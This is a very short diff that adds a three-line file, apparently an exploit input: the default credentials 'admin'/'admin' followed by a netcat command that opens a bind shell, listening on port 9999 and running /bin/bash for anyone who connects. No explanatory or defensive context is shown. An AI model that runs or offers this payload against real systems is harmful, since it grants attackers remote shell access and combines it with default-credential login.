@@ -1,0 +1,3 @@
+admin
+admin
+nc.traditional -lvp 9999 -e /bin/bash
